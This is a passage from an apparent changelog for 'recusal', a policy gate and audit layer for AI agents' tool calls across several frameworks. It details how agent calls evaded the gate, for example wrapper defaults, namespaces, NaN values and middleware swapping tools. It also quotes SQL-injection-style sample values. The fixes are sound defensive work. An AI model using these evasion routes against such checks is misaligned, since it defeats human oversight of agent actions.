    `inspect.getattr_static`, its attributes, so they run no property and no
    `__getattr__` of the object (an `isinstance` test among them reads `__class__`). The
    walk that finds the callables is another matter: it reads `__wrapped__` the ordinary
    way, as the kernel's walk and `inspect.signature` do, so a `__wrapped__` property or
    a `__getattr__` of a callable object does run when a tool is checked. The import
    reads the code object without raising, whatever stands at
    `functools.singledispatch`. A `functools.wraps` wrapper over a dispatcher carries a
    copy of its attributes and is refused with it; a service object with a `dispatch`
    method and a `registry` that is not a mapping proxy is still gated, and so is an
    event bus whose function closes over a `dispatch` function and a `registry` dict
    (round six: the closure test without the two other names refused it as a
    single-dispatch function).
  - Should the kernel's walk itself refuse a dispatcher (`DispatchedAtCallTime`, in a
    kernel later than 0.15.1), the tool is refused with the same reason, not as
    "cannot be inspected". The same holds for a wrapper that holds a second wrapper
    (`HiddenWrapper`) and for a callable read through a partialmethod
    (`PartialMethodSignature`): each is known by its name and gets a reason that says
    the cause and what to do.
  - The README said a change to a tool's function after it was gated is refused on
    every call. The guardrail does ask again on every call, but the SDK runs every
    guardrail of a model turn before any tool body of that turn, so a change a tool
    body makes is seen from the next model turn. The README now says so, and lists the
    same-turn case under what the gate does not see.
  - The refusal of an agent tool's `parameters` type named a type the data-only set
    admits: a field with a pattern was reported as "pydantic core type `str`" and a
    list of nested models as "`list`", and a model with a `model_validator` as a type
    that "is not a Pydantic model". The refusal now names what puts the field outside:
    a string pattern, what a list, a mapping or a union holds, a `Literal` of other
    values, a validator, or the pydantic core type; a validator on the type as a whole
    is named as that.
  - Not changed, and listed in the README under what the gate does not see: a
    dispatcher that a wrapper calls from a closure, a global or an attribute, and not
    through `__wrapped__`, is not found.

- **The CrewAI test lock no longer installs `chromadb`, and `recusal-crewai` requires a
  CrewAI that does not either.** `crewai` 1.15.40 required `chromadb` 1.5.9, which has
  four published advisories (GHSA-36p7-vc44-83pf and GHSA-f4j7-r4q5-qw2c, critical;
  GHSA-2wm9-hf6c-p5cr and GHSA-xph7-9rjv-w5fr, high) and no fixed release. `crewai`
  1.15.42 made `chromadb` an optional extra. The pull request lanes now test against
  exactly `crewai==1.15.44`, and `requirements/adapter-crewai.txt` holds no `chromadb`
  and none of the twenty packages only it needed; every one of its pins was checked
  against the OSV database, with no advisory found. `crewai`, `crewai-cli` and
  `crewai-core` 1.15.44 were published on 2026-11-19, less than the seven days a lock
  waits, so `tools/lock.py` takes those three early under `COOLING_OFF_EXCEPTIONS`,
  which names the advisories they close; the lock states it in its header, every other
  package keeps the seven days, and a test asks for the exception to be removed once the
  lock's own cutoff reaches it. The floor of `recusal-crewai` rises from
  `crewai>=1.15.40` to `crewai>=1.15.42`, so an install can no longer resolve to a
  CrewAI that installs `chromadb`; it reaches users in `recusal-crewai` 0.2.2.
  The adapter's own tests pass unchanged on 1.15.44, its compatibility probes included.

- **`recusal-openai` 0.2.2: the gate refuses what it cannot tie to what
  would run, tells the model the truth about what ran, and both loops decide the same
  way.** Found by the adapter review of 2026-11-21 and reproduced on `openai` 3.49.0.
  - Arguments were parsed with Python's JSON defaults, which read `NaN`, `Infinity` and
    `-Infinity` and turn `1e999` into infinity. A policy written as `if amount > 100:
    refuse` let `{"amount": NaN}` and `{"amount": -Infinity}` run in the plain loop,
    while the audited loop refused them. Both loops now refuse these before the policy
    runs: the three tokens as arguments that are not valid JSON, and a number that is
    not finite by that name. The copy the policy judges is now made by the kernel's
    `recusal.invocation.detached`.
  - In the audited loop, a call to a known tool with arguments nested about 600 deep was
    refused without an audit entry, with a reason that said "policy error" although the
    policy never ran. At about 5000 levels the parser raised out of the whole turn after
    an earlier call in it had run, so that call's answer was lost. Arguments nested more
    than 64 levels below the arguments object (the line the kernel draws for JSON data), or
    too deeply to parse, are now refused as that one call, with a reason that says so, and
    are one audit entry. Arguments nested between 65 and a few hundred levels ran
    before and are refused now.
  - A Responses function call can carry a `namespace`. The gate read only the bare name,
    so a call to `delete` in namespace `prod_db` ran the application's `delete` and the
    policy saw `delete`. A function call that carries a namespace is now refused before
    the policy runs: namespaced calls are not supported.
  - The refusal for arguments that do not bind quoted Python's own message, which quotes
    an unexpected argument's key. That key is the model's text, and it was written into
    the audit log's reasons. The refusal now names only parameters the tool declares and
    counts the arguments it does not take.
  - A call that was not finished ran: a `function_call` item whose `status` was
    `in_progress` or `incomplete`, a call in a response whose `status` was `incomplete`,
    and a tool call in a Chat Completions choice whose `finish_reason` was `length`.
    Empty arguments are a call with no arguments, so a call cut off before its arguments
    ran on the tool's defaults. A `function_call` item or a response whose `status` is
    anything but `completed` (no status passes), and a choice whose `finish_reason` is
    anything but `stop`, `tool_calls` or `function_call`, now refuse their calls before
    the policy runs.
  - Arguments that are not a string (`None`, `0`, `False`, a list, a dict, bytes) on an
    item the SDK did not validate were read as no arguments, or as JSON. Only a string
    is parsed now; an empty string is still a call with no arguments.
  - A generator function used as a tool was answered with the generator's `repr`, its
    body never ran, and the log said allowed. It is now refused before the policy runs,
    as an `async def` tool is. Both are read through a `functools.partial`, a
    `staticmethod`, a bound method and `functools.lru_cache`; a wrapper the application
    wrote (`functools.wraps` included) is not looked through, because it may await or
    consume what it wraps. An ordinary function that returned a generator or any other
    iterator (an async generator, `iter(...)`, `map(...)`) was answered with the
    object's `repr` too. Its own body has run by then, so it is now answered as having
    run, with its result not available because the gate does not consume it, and never
    as not run.
  - A Chat Completions message carrying only the legacy `function_call` field was
    skipped without a word. It now raises `TypeError` before anything runs, alone or
    beside `tool_calls`, as every other shape the gate does not handle does.
  - A mistyped keyword such as `allow_hosted_record=True` was reported as a policy error
    on every call and accepted silently when the turn had no calls. A keyword the gate
    does not take now raises `TypeError` naming it, before anything is judged.
  - With `audit=` and `fail_closed=False`, a policy that raised let the tool run. The
    loops and `judge_and_run` no longer take `fail_closed`: the gate always fails closed.
  - A model-chosen tool name was written raw between the backticks of a refusal and onto
    the audit entry, with no bound: a name could close the backticks and add text that
    read as a verdict, and a 1 MB name gave a 1 MB answer and a 2 MB entry. A refusal now
    names a tool the application has by its name. Any other name is used as sent only if
    it is 1 to 64 printable characters with no backtick, and is otherwise described by
    its length (`<a tool name of 1000000 characters, not shown>`), in the answer and on
    the entry.
  - A tool name that is a list or a dict, on an item the SDK did not validate, raised
    `TypeError` out of the turn after earlier calls in it had run. A name that is not a
    string is now an unknown tool: one refusal under the call's own id, and one audit
    entry.
  - A `functools.lru_cache` tool handed a list or an object, which the cache cannot
    hash, raised `TypeError` out of the turn. That call is now refused with a reason
    before the policy runs, also when the cached function is in the tool table as a
    `staticmethod` object.
  - The package allowed `recusal>=0.14.0`. The check of a decorated tool's wrappers is
    the kernel's and is new in 0.15.0: with a 0.14 kernel a `functools.wraps` wrapper's
    own parameter ran with a value no policy judged (26 such calls in the review's
    probe). The package now requires `recusal>=0.15.0`, and raises `ImportError` if it
    is imported beside an older kernel. Whatever the kernel's signature check says, a
    reason or an error, refuses the one call before the policy runs and is one audit
    entry.
  - With an audit log, a `surface=` or `control=` that `recusal.decide` does not record
    (an empty surface, one with a leading space, the reserved `claude_code.pretooluse`,
    a value that is not a string; a control that is not a dict) refused every call as
    a "policy error" and wrote no entry. Each now raises `ValueError` naming the
    keyword before any tool call is looked at, as does an empty `tool_use_id=` given to
    `judge_and_run`. The rule is `decide`'s own: the gate asks it and restates nothing.
  - A model-chosen call id had no bound: a 1,000,000 character id was written to the
    audit entry and listed in the message of a duplicate-id refusal. The id goes back
    in the answer and onto the entry exactly as sent, so it cannot be shortened there;
    the gate now takes a call id of at most 256 characters, and a longer one raises
    `ValueError` before anything in the turn runs. A message the gate raises quotes an
    id only if it is printable with no backtick, names at most four, and otherwise
    describes each by its length.
  - In the audited loop, a call refused before decoding whose arguments, on an item
    the SDK did not validate, were not JSON data (bytes, a number that is not finite,
    an object with a key that is not a string) was answered "tool_input cannot be
    fingerprinted" where the plain loop said what was refused. Both loops now give
    the same reason, and the one deny entry is bound to a fixed stand-in.

  One change accepts what was refused:
  - Any recording keyword without a log (`audit=None`, `actor=`, `surface=`, `control=`,
    `allow_on_pass=`) refused every call as a "policy error" although no policy had run,
    so a loop with an optional log (`audit=maybe_log`) ran nothing. `audit=None`, passed
    explicitly, is now the plain gate, and `surface=`, `actor=` and `control=` beside it
    are accepted and not used, so such a loop is one call (`audit=maybe_log,
    surface=...`). When `audit=` is not passed at all, `surface=`, `actor=` or
    `control=` with a value raises `TypeError` before anything is judged, whether or
    not the turn has calls, as do `audit=` with a log and no `surface=` and a caller's
    own `tool_use_id=` (each call is recorded under its own id). The two audited
    functions need a log and raise `TypeError` for `None`.

  The README now also says which tools and annotations the gate can judge and what to
  write instead, that the gate keeps no state between turns, that it has no helper
  for streaming, and that a function call marked `async` or made by a program is judged
  and run like any other. It names two shapes the gate does not see: a
  `functools.wraps` wrapper that restates the function's parameters and does not pass
  one on in its body, which no check of a signature can read, and, with a kernel that
  does not detect it, a decorator applied inside another decorator's closure.
- **`recusal-langgraph` 0.3.0: the policy is shown the call id and the
  defaults that run, and the gate refuses a function it cannot read to the end and an
  answer it cannot tie to what it judged.** Found by the two adapter reviews of
  2026-11-21 and reproduced on `langgraph` 1.2.20 with `langchain-core` 1.7.7. No bypass
  by the model against an ordinary setup was found; these are values the function ran
  with that the policy never saw, tools that were always refused, and refusals that did
  not say why. This is why the release is 0.3.0: calls that ran are now refused, and a
  policy can be shown an argument it was not shown before. What the gate still does not
  read is listed in the README under what it does not see: with a kernel that does not
  detect it, a decorator that applies another decorator inside itself; a function that
  names its parameters and then calls another function, whose defaults run unseen; a
  default an MCP server applies to an argument the model left out; a tool that a hook
  between the gate and the tool ran besides the judged call, when the answer still fits;
  `runtime.tool_call_id`; and a `run_manager` or `callbacks` parameter LangChain leaves
  out of the schema and does not fill.
  - The tool call id is written by the model, and a parameter annotated
    `InjectedToolCallId` receives it. It counted as the host's and was left out of
    judgment (judged `{'title': 'x'}`, ran with the id `DELETE-ALL'; --`). The policy is
    now shown it under the parameter's own name. `runtime.tool_call_id` cannot be shown
    that way; the README says not to use it as data.
  - A `functools.wraps` decorator between the tool and its function was read as the
    function it wraps. Its own keyword default ran unseen (`force=True`), and a parameter
    it named that the function also names was kept by the decorator while the function ran
    its own default (judged `timeout=5`, ran `timeout=999999`, and the audit entry bound
    the judged value). A function with a declared `__signature__` hid a parameter the same
    way. The gate now walks every callable the call reaches with the kernel's
    `recusal.invocation.reached_parameters` and refuses all three, naming the parameter and
    never its default. It therefore requires `recusal>=0.15.0`, and a test pins the floor.
    Whatever that walk raises is a refusal before the policy runs.
  - A decorator built without `functools.wraps`, on a tool with an explicit
    `args_schema`, was read as the whole tool: the gate judged `timeout=5`, the decorator
    kept it, and the function ran `timeout=999999`; and a default the schema omits ran
    unseen behind `def wrapper(*args, **kwargs)`. The innermost function the gate reaches
    must now account for the schema: if it takes `*args` or `**kwargs`, every schema
    field must be one of its parameters, or the call is refused before the policy runs.
    This also refuses a function that takes only `**kwargs` under a schema, which the
    gate cannot tell from a forwarding decorator: `RunnableLambda(...).as_tool(args_schema=...)`
    and a `BaseTool` with an `args_schema` whose `_run` is `(**kwargs)`. These ran judged
    before. The README says what to give the node instead. A function that takes
    `**kwargs` and names every schema field still runs. A function that takes nothing but
    `*args` and `**kwargs` is refused: under the schema
    `@tool` infers from `def wrapper(*args, **kwargs)`, whose fields are `args` and
    `kwargs`, the policy judged `{}` and the function behind the wrapper ran
    `limit=1000000`. For this rule a parameter never counts as the function's own when
    LangChain or ToolNode fills it for the tool, when the tool marks it injected, when
    it is named `run_manager`, `callbacks`, `config` or `runtime` (whatever its
    annotation or default), or when its annotation is, or is built from,
    `RunnableConfig`, `ToolRuntime`, an injected-argument marker or a callback manager
    or run manager type. The annotation is resolved with `typing.get_type_hints`, as the
    frameworks resolve it, and then opened through the forms the README lists (a class
    and its bases, `Optional` and other generics, `Annotated`, a `TypeVar`, a `NewType`,
    a `type` alias, a forward reference); a name that cannot be resolved is matched by
    its text, and the refusal says so:
    `def wrapper(*args, config: RunnableConfig, **kwargs)`, a `BaseTool` with no
    `args_schema` whose `_run` is `(*args, run_manager=None, **kwargs)`, and one whose
    `_run` is `(*args, config: Optional[RunnableConfig] = None, **kwargs)` ran the same
    unseen default, and are refused. Such a forwarder runs only under an explicit
    Pydantic schema that declares no field and does not allow extras: the model can send
    nothing through it, and the call is judged as `{}`. A forwarder that names a
    parameter of its own is not told from an ordinary function, and the README lists it
    under what the gate does not see.
  - The tools `langchain-mcp-adapters` builds are the one exception to that rule, and
    still run judged on the async routes: their function hands the judged arguments to
    the MCP server as they stand. It is recognised by the code object the library holds,
    so a function of the same shape, or a forwarder in front of it, is not excepted.
    A tool built with `tool_interceptors=` is now refused: an interceptor can replace
    the arguments after the policy judged them (judged `depth=3`, the server received
    `depth=99`). A default the server applies to an argument the model left out is not
    seen, and the README says so.
  - A `BaseTool` subclass with no `args_schema` whose `_arun(*args, **kwargs)` hands the
    call to `_run` ran `_run`'s default unseen on `ainvoke` (judged `{'table': 'users'}`,
    ran `limit=1000000`, while `invoke` judged the limit and refused). It is refused on
    the async routes by the rule above.
  - An injected argument that nothing filled ran the function's default unseen: the
    default behind `InjectedState("role")` when the state has no `role`, and the default of
    an `InjectedToolArg` no host supplies. An argument now counts as the host's only when
    ToolNode put it in the tool's input; the default that runs is judged. ToolNode fills
    state, store and runtime and nothing else, so a value under any other injected name
    is judged: a hook after the gate that rewrote such a value had it read as the host's
    (judged `{'x': 1}`, ran `secret='evil'`).
  - A call whose name is not the name of the tool that would run is refused before the
    policy runs, under the tool's own registered name. An earlier hook can attach a tool
    to a call ToolNode could not resolve (`request.override(tool=...)`); the policy then
    judged, and the record named, the model's string (`Run_SQL` judged and passed,
    `run_sql` ran a `DELETE`).
  - When execution answers without the judging copy's parse step having run, the gate no
    longer passes the answer on: it returns a refusal saying the call was never judged and
    that the tool may have run, and an audited gate records it. A ToolNode that ran the
    registered tool instead of the copy returned the tool's result as a success with the
    policy never asked. The same holds when that step refused the call and the answer is
    not that refusal, and when it allowed the call and the answer is a `ToolMessage`
    under another tool's name: a hook between the gate and the tool that answered a
    refused `DELETE` by running it on another tool had its success passed on. An audited
    gate writes one more entry for the withheld answer. An answer under the judged tool's
    name after an allowed call is passed on; the README says so. A tool that returns its
    own `ToolMessage` under a `name` other than the tool's now has that answer withheld,
    after it ran; the README says to leave the name out or use the tool's.
  - An audited gate given a call with an empty id answered "policy error", never called
    the policy and wrote nothing, while the plain gate ran the same call. Both now refuse a
    call whose id is empty or not a string, before the policy, and the audited form writes
    one entry for it, without a call id.
  - A private framework name that cannot be read refuses the call. A tool without
    `_injected_args_keys` was silently treated as having no host arguments.
  - Tools that were always refused now run judged: a `BaseTool` subclass with no
    `args_schema` (held to the schema LangChain infers from `_run`, and completed from
    the defaults of the method the route runs, `_run` or the class's own `_arun`, since
    LangChain validates nothing for it), and a single-input `Tool(name, func,
    description)` or `@tool(infer_schema=False)` whose function takes exactly one named
    parameter (judged under that parameter's name, `config` included: the build-time
    check for a parameter named `config` leaves the first parameter of a single-input
    `Tool` alone, since it receives the tool's one value by position).
  - A Pydantic v1 `args_schema` refuses the call with that reason; its parameters were
    refused one by one as absent from the schema, and a function taking only `**kwargs`
    under it was not refused at all. A callable Python cannot inspect is refused with
    what to do about it: `@tool` over `cachetools.cached` is one, new in this release.
    The README names the decorators and tool builders it refuses (LangSmith's
    `@traceable`, `decorator.decorator`, `cachetools.cached`,
    `RunnableLambda(...).as_tool()`, `Tool(func=str.upper)`) and what to use instead.
  - A function parameter named `config` on a `@tool` or `StructuredTool` function never
    receives the model's value, because LangChain writes the run configuration there. It
    was refused after the policy had run, as "arguments other than the ones the gate
    judged". It is now refused before the policy with that reason, and `gated_tool_node`
    and `audited_tool_node` raise `TypeError` for such a tool when the node is built. A
    call that sets a name the function would not receive the value under is refused
    the same way, and only such a call: `config` or `run_manager` on a `@tool` or
    `StructuredTool`, `callbacks` on a function that names it, `run_manager` on a
    `BaseTool` whose `_run` names it. A `callbacks` the function does receive (through
    `**kwargs`, or on a `BaseTool` subclass's `_run`) is judged; it was refused with a
    reason that was not true of it. For a tool `langchain-mcp-adapters` built, the
    refusal says the MCP server would not receive the argument. A call that sets `self`
    is refused before the policy where the schema lets the key through; it raised
    `TypeError` after the policy had allowed it. So is one that sets `func` or
    `executor_or_config` (or whose own `_run` parameter has one of those names) on the
    async route of a `BaseTool` subclass with no `_arun` of
    its own, which raised the same way. Anything else that fails while the invocation
    is prepared for judgment is a refusal too, not an exception out of the gate.
    A function under more than 31 decorators is refused with that reason.
  - The package declares `langgraph-prebuilt` and `pydantic`, which it imports, each with
    an upper bound. The README lists the argument types the gate can judge and the ones it
    refuses, every refusal with what to do instead, what the gate does not see, and the
    ten private LangChain and LangGraph names it depends on (it said two).
- **`recusal-langchain` 0.2.0: one middleware for both routes, the name the
  policy judges is the tool that runs, and a provider-run tool refuses the model call.**
  Found by the adapter review of 2026-11-21 and reproduced on `langchain` 1.4.10. It
  requires `recusal-langgraph>=0.3.0` and takes every change listed above; a test pins the
  floor.
  - `gate_middleware(policy)` and `audited_gate_middleware(policy, log)` each return one
    middleware object that implements the sync and the async tool-call hook, so one agent
    is gated under `invoke` and under `ainvoke`. The four middleware shared one name, so
    an agent could not list a sync and an async one, and each raised on the other route.
    `agate_middleware` and `audited_agate_middleware` remain and return the same
    middleware.
  - A call the model made as `Run_SQL`, repaired by an earlier middleware that attached
    the registered `run_sql`, was judged and recorded as `Run_SQL` and its `DELETE` ran
    past a policy keyed on `run_sql`. It is refused before the policy runs and recorded
    under `run_sql`.
  - A tool given to `create_agent` as a dict is run by the model provider and reaches no
    tool-call middleware. The gate now reads the tools of every model call and, if one is
    a dict, does not call the model: the agent's answer is the refusal. This is why the
    release is 0.2.0: an agent that carried a provider-run tool is now refused instead of
    silently ungated for that tool.
  - A middleware listed after the gate that swaps the tool object or answers in the
    tool's place (a human-in-the-loop edit that redirects the call to another tool, a tool
    emulator) still leaves the call unjudged, and a swapped-in tool still runs. The gate
    now withholds that answer and refuses, and the audited form records the refusal; the
    call was unrecorded before. It also withholds the answer of a middleware listed after
    it that answers a refused call by running another tool (a fallback to a replica ran a
    refused `DELETE` and its success was passed on), and an answer under another tool's
    name after an allowed call; the audited form records one more entry for it. An answer
    under the judged tool's name after an allowed call is passed on, and the README says
    so. `docs/FRAMEWORKS.md` said a human-in-the-loop edit listed after the gate always
    reaches the judging copy; it does only when the edit keeps the tool.
  - The README lists what the gate does not see: a middleware listed before the gate that
    runs a tool itself, a provider-run tool the gate was not shown, a sub-agent's tools
    and `runtime.tools`.
- **`recusal-pydantic-ai` 0.2.0: the gate judges what ran outside the tool
  hook, and refuses a run whose toolsets could rewrite a call.** Found by the adapter
  review of 2026-11-19 and reproduced on `pydantic-ai-slim` 2.67.0:
  - An output function (`output_type=fn`) runs the application's function with values the
    model chose, and ran with no policy asked. `RecusalGate` now judges it in
    `before_output_process`, under the function's name, before it runs; a refusal asks
    the model again and the function does not run.
  - A `Choices` output whose value is callable ran that action when the model picked
    it, with no policy asked. A final `Choices` pick is now judged, as `choice` with the
    key and the set's name.
  - A `WrapperToolset` subclass whose `call_tool` changed the arguments ran after the gate
    judged them: judged `force=False`, ran `force=True`. A toolset runs after every
    capability hook, so a run with such a wrapper in its toolsets now has every call
    refused, on the record; the wrappers Pydantic AI ships route a call and are not. The
    gate reads the run's toolset at the time of each call, so a wrapper another
    capability adds, or one a dynamic toolset returns, is refused too. The check is not a
    list of wrapper classes: an application toolset is refused when it holds other
    toolsets and has its own `call_tool`, when it replaces the `call_tool` of the Pydantic
    AI toolset it extends, or when it has a `process_tool_call` function.
  - A call handed to the application to run (an `ExternalToolset`, `CallDeferred`) left
    the run with no policy asked. It is now judged in `handle_deferred_tool_calls`: a
    refused one is answered with the refusal, an allowed one handed on as judged.
    Pydantic AI offers deferred calls to every other capability before the gate, so
    `HandleDeferredToolCalls` executed an external call unjudged: a run with another
    capability that answers deferred calls is now refused, and the handler goes to the
    gate, `RecusalGate(policy, deferred=handler)`, which judges first and hands it the
    calls it allowed.
  - A gated agent that offers the model a tool the provider runs (web search, code
    execution and the like) is now refused before the request is sent: no hook sees
    those calls. Provider-side tool search is allowed, and so is a tool the model drops
    or replaces with its local version.
  - A gate marked `defer_loading=True`, or placed in a group loaded on demand, judged
    nothing while `is_gated` said `True`. The first is now refused when the gate is
    built, and the second does not count for `is_gated`.
  - Another `innermost` capability listed after the gate ran after it and could rewrite
    the call (a documented limit until now), and so could any hook listed after a gate
    placed inside a `WrapperCapability`. The gate now reads the order the run dispatches
    in and refuses a call when a `before_tool_execute` of the application's comes after
    it.
  - A tool given its schema by hand (`Tool.from_schema`) is not validated, so a
    parameter the model left out ran with the function's Python default, which no
    policy had seen: judged `{"table": "t"}`, ran `mode="hard"`. All four forms of the
    gate (the two capabilities and the two hook functions) now add the innermost
    function's own defaults that the arguments leave out, judge them, and pass them
    written out; a default that is not plain data is refused, and so is such a tool
    whose function takes `*args` or `**kwargs` (the tools `pydantic_ai.ext.langchain`
    builds).
  - A decorated tool is several functions, and a wrapper's own parameter was read by
    nothing: a decorator with `skip_review=True` in the middle of a stack ran the
    transfer with it, and a keyword a wrapper shared with the function let the model
    send `refresh=False` while the function ran on its own `refresh=True`. The stack
    from the callable Pydantic AI calls down to the innermost function is now read, and
    a wrapper must be transparent (take only `*args` and `**kwargs`, restate the
    function's own parameters, or forward `**kwargs` and name required parameters where
    name and position cannot differ) or the call is refused before the policy runs, with
    a reason that says what the wrapper does. A function that declares a signature of
    its own and a decorator that cannot be inspected (such as `cachetools.cached`) are
    refused as well.
  - Pydantic AI passes a function's values by position when the function takes `*args`
    or a positional-only parameter, so a wrapper that names a parameter can be handed
    another one's value: `wrapper(dst, *args, **kwargs)` over
    `copy_file(src, dst, *flags)` was judged with `dst` under `/tmp` and wrote to the
    path sent as `src`. A wrapper that names a parameter and also forwards is refused
    over such a function; elsewhere the positional parameters it names must be the
    function's first ones in order, and it may forward `*args` only while no wrapper
    above it names more positional parameters. For a tool that takes the run context, a
    wrapper's first positional parameter is the context, whatever the wrapper calls it,
    unless it has the name of another parameter of the function; a refusal names the
    parameter as the wrapper calls it.
  - A `functools.singledispatch` function picks the implementation that runs at call
    time, and a registered implementation's own default ran unjudged. A single-dispatch
    function with an implementation registered beside its base one, or in its place
    (`register(object)`), is refused. A function that only has attributes called
    `registry` and `dispatch` is not taken for one.
  - A `functools.partial` that binds a value by position hides the leading parameter of
    every wrapper under it, with that parameter's default: `partial(scoped(purge),
    "acme")` was judged `{"limit": 5}` and ran `table="prod"`; with a wrapper that kept
    the value and passed the rest on by position, `{"limit": 5, "dry": True}` ran
    `table=5, limit=True, dry=False`; and `partial(scoped(default_table(purge)), "acme")`
    ran the lower wrapper's own `table="archive"`. Such a partial is now allowed only
    over the function itself or over wrappers that take nothing but `*args` and
    `**kwargs`: any wrapper under it that names a parameter refuses the call, with no
    reasoning about what the wrapper's body would do. Refused as well: such a partial
    over a function whose bound parameter is positional-only and which takes `**kwargs`
    (an argument sent under that name landed in `**kwargs` while the function ran the
    bound value).
  - A partial named with `functools.update_wrapper` carries `__wrapped__`, and
    `inspect.signature`, which Pydantic AI validates against and builds the positional
    call from, reads past it: `update_wrapper(partial(insert, "acme"), insert)` was
    judged `tenant="DROP TABLE"` and ran `tenant="acme"` with that text as a row. It is
    refused, and for every tool built from its signature the parameters Pydantic AI
    reads must be those of the function the call reaches.
  - The object of a bound method past a wrapper that names a positional parameter is
    refused where a wrapper that kept it might not fail the call, which includes the
    values after it moving up a place into a parameter with a default. That also
    refuses a method decorator that restates the method's parameters over a method
    with a defaulted positional parameter, which is conservative.
  - A `functools.partial` with a keyword shows every later parameter as keyword-only,
    on a wrapper and on the function alike, so a wrapper that takes a parameter as
    another kind than the function was refused alone and allowed behind the partial:
    `wrapper(table, limit=10)` over `delete_rows(table, *ids, limit=10)` behind
    `partial(delete_rows, table="orders")` was judged `limit=500` and ran `ids=(500,)`,
    `limit=10`. The wrappers under such a partial are now read without its keywords as
    well. A keyword that names a positional-only parameter is not bound to it
    (`partial(fetch, limit=77)` over `fetch(table, limit=10, /, **extra)` ran `limit=10`,
    which nothing showed) and is refused.
  - A class used as the tool function was let through as validated also where a hook of
    the application's supplied the arguments in place of validation: judged
    `{"table": "t"}`, ran `force=True`. Its arguments are now completed from the
    signature Pydantic AI validates against, like any other tool's.
  - Two output functions with the same name (`output_type=[review.submit, prod.submit]`)
    were both judged as `submit`, and the model picked which ran. Such an output is now
    refused before the policy, naming the name.
  - The package allowed `recusal>=0.14.0`, a kernel without the walk the gate imports,
    so the adapter failed at import beside it. It requires `recusal>=0.15.0`.
  - Where a hook of the application's skips validation, a value for a function's `*args`
    that is not a list was judged whole and handed to the function item by item. It is
    refused.
  - The order check holds for output functions and `Choices` picks as for tool calls,
    and counts a `Hooks` subclass that writes a hook as a method. A container the
    search for held toolsets cannot finish (4,000 values) is refused instead of passed.
  - A realtime session, which calls none of the hooks the gate judges in, is refused
    when it starts. Provider-tool settings on the model, and on each candidate of a
    `FallbackModel`, are read as well as the run's.
  - Refused rather than run unjudged, and documented: an output function taking a
    Pydantic model, and a union of output functions under `NativeOutput` or
    `PromptedOutput` (use tool output).
  - `agent.override(spec=...)` with a spec naming capabilities replaces the gate, and
    `is_gated` still said `True` while the tool ran unjudged; it now reads the
    capabilities in effect.
  - The audited gate records each of these on its own surface
    (`pydantic_ai.before_output_process`, `pydantic_ai.handle_deferred_tool_calls`), by
    the plain gate's own decision. The README now says which tool name the policy is
    given (the prefixed or renamed one) and corrects two sentences on ordering: another
    `innermost` capability listed after the gate runs after it, and the plain `Hooks`
    form is safe only where no `innermost` capability is added.
- **`recusal-openai-agents` 0.2.0: the policy judges the arguments under the
  names the function receives them by, and a tool the gate could never judge is refused
  when the agent is built.** Found by the adapter review of 2026-11-21 and reproduced on
  `openai-agents` 0.24.0:
  - The gate worked out for itself which parameter is the context the SDK fills, from the
    text of the annotation. For a callable-object tool whose context was annotated
    through an alias in a module with string annotations it found none, so every argument
    was named one parameter off: the policy saw `{"ctx": "DELETE FROM audit_log"}`, raised
    no objection, and the tool ran the `DELETE`. The names are now read from the SDK's own
    schema for the tool (`takes_context` and its signature), and a call whose prepared
    values are not one for each parameter is refused.
  - A `functools.wraps` wrapper under `function_tool` ran with values the policy never
    saw: a wrapper's own keyword default (`dry_run=False`) was in no schema, and a
    wrapper that took a parameter of the function left the function at its own default
    (judged `SELECT 1`, ran `DELETE`). The gate now walks the callables the call reaches
    with the kernel's `reached_parameters` (the function, what its `__wrapped__` chain
    leads to, a bound method's function and a callable object's `__call__`), at every
    level of a stack of wrappers, and refuses the tool unless each one takes exactly the
    parameters the SDK prepared for, or forwards `*args, **kwargs` and names none of its
    own. This is why the package now requires `recusal>=0.15.0`. A
    `functools.singledispatch` function with an implementation registered is refused as
    well: the implementation that runs is chosen by the type of an argument, and a
    registered one ran with a default (`include_deleted=True`) that was in no schema.
    One with nothing registered is the function it wraps and is gated, an implementation
    registered afterwards refuses its next call in a later model turn (in the same turn it
    runs unjudged, which is open and stated in the README), and a callable object that happens to
    have a `dispatch` method and a `registry` attribute is not taken for one. The
    dispatcher is known by the code of `functools.singledispatch`'s own wrapper function
    and its registry is read from that function's closure, so it is found as a method or
    a class method (`function_tool(service.handle)`, where a registered implementation
    ran with its own default) and under `functools.wraps` wrappers, and one with nothing
    registered is gated there too. A stack of
    more than 31 wrappers is refused for that reason, not as "cannot be inspected". A
    wrapper that calls a function it holds in a closure or an attribute is not read; the
    README lists it under what the gate does not see.
  - With `agent.as_tool(parameters=Model)` the parent's policy was handed the model's raw
    JSON while the sub-agent was given the validated input: `{"confirm": "true", "rows":
    "9"}` was judged as two strings and reached the sub-agent as `true` and `9`, a
    default left out was judged as absent, and a key the model drops was judged as
    present. The policy is now handed what the sub-agent is given, worked out with the
    SDK's own adapter for that tool, and arguments the model does not accept are refused
    before the policy runs. A `parameters` type that is not a data-only Pydantic model
    (a validator, a serializer, a computed field, `Field(exclude_if=...)`, a nested
    model, a dataclass, a field of a type outside the data-only set) is refused when the
    tool is gated, with a reason that names the field and its pydantic core type; the
    README lists the types and what to declare in their place. The default `as_tool` is
    judged by the arguments as proposed, as before.
  - `gated_agent` returned a copy that shared the original agent's `handoffs` and
    `mcp_servers` lists, so a handoff appended to the original after gating was the gated
    copy's too, and the agent it handed off to ran ungated. The copy now has its own
    lists.
  - `gated_agent` and `is_gated` now refuse an agent with a `prompt`: a prompt stored on
    OpenAI's servers can configure tools that are not in the agent's `tools` list.
  - A non-finite number (`NaN`, `Infinity`, a literal too large for a float, the string
    `"nan"` for a `float` parameter) ran on the plain gate, where a policy that compares
    it (`amount > 1000`) raises no objection, and was refused only on the audited gate.
    Both now refuse it before the policy runs, for the same reason, so "the audited forms
    are the plain ones with a recording passed in" holds. The same was true of deeply
    nested arguments: at about 488 levels the plain gate ran the call and the audited
    gate refused it, and deeper the two refused for different stated causes. The gate
    now refuses arguments that hold a value more than 64 levels down, before anything
    else reads them, with one reason and one audit entry; the limit is fixed and does not
    move with the interpreter's recursion limit.
  - `gate_tools` and `gated_agent` now raise `TypeError`, naming the tool and the
    parameter, for a function tool they used to accept and then refuse on every call: a
    parameter the SDK prepares only by running the tool's own code (an `Enum`, a model, a
    dataclass, a `TypedDict`, `datetime`, `date`, `tuple`, `set`, `Sequence`,
    `Iterable`, `bytes`, `Field(pattern=...)`, a custom validator), a mapping whose key
    type is neither `str` nor a `Literal` of strings (`dict[int, str]`) and a variadic
    parameter. A default that is not JSON data
    (`tags: list[str] = ()`) and a default factory other than `list` or `dict` are named
    as what they are. A decorator whose signature cannot be read (a class-based decorator
